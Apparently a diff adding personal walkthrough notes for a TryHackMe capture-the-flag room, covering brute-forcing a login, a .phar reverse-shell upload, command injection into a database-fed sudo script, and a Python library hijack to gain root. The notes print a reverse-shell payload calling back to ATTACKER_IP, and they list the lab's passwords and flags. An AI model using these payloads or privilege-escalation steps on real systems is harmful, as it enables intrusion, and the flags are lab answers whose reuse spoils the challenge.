@@ -1,0 +1,75 @@
+/app = leads to a login page but only asks for password. 
+
+====Brute Forced the form ====
+password credential is "password" 
+==================================
+
+=================================
+The CMS have a known exploit from exploit db but it's a useless shell. The good 
+thing is i know what kind of file it accepts which is "*.phar"
+=================================
+
+Uploaded my reverse shell and that's how i hacked into the web server
+
+====================
+#LINPEAS NOTES
+====================
+Executables by users:
+-/opt/test.py
+/home/death/getDreams.py
+----------------------
+MYSQL FOUND
+----------------------
+Users found:
+lucien = uid:1000
+death = uid:1001
+morpheus = uid:1002
+====================
+
+Based on the UID's. This means we have to escalate to Lucien -> Death -> Morpheus
+
+====================
+#LUCIEN
+====================
+-Lucien has a file found by linpeas that is in /opt/test.py
+-Checking the file, it displays lucien's password which is "HeyLucien#@1999!"
+-sudo -l runs = (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
+-flag found in /home/lucien = THM{TH3_L1BR4R14N}
+-mysql_history shows that lucien have an access to the database
+-bash_history confirms that "mysql -u lucien -p"
+-bash_history shows the credentials mysql -u lucien -plucien42DBPASSWORD. with
+that information the password should be "lucien42DBPASSWORD"
+#what's the connection between lucien and the ability to run the script that is
+#displaying something from the databases????????
+-Apparently, I can use the "getDreams.py" script to escalate my privelege to Death
+by modifying the content of a column value. That's the connection with lucien's
+ability to run the script.
+-Tried using the same concept to display the getDreams.py content as Death but the 
+password is still redacted. Sadge
+-";/bin/bash;' gets me into death but it keeps giving a dumb shell -_-
+-correct shell ==== ';/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1";'
+===================
+#DEATH
+===================
+-Just like lucien, death has a file in /opt/getDreams.py
+-getDreams.py has death's credential but the problem is his password is #redacted
+-Death's flag = THM{1M_TH3R3_4_TH3M}
+-Death's password credential = "!mementoMORI666!"
+===================
+#MORPHEUS
+===================
+-I can read into Morpheus as death
+----------
+Files:
+-kingdom
+-restore.py
+----------
+-I can run it but i don't have permission to write in the output path which is
+/kingdom_backup/kindgom
+-I noticed that there is a specific script that is showing on the error message
+when i run "restore.py"
+-Another good thing is I CAN FUCKING WRITE ON IT. 
+-shutil.py has a copy2 function that has been imported within shutil function.
+Changed the whole script with a revshell and it gave me ROOT ACCESS!!! 
+-Morpheus flag = THM{DR34MS_5H4P3_TH3_W0RLD}
+
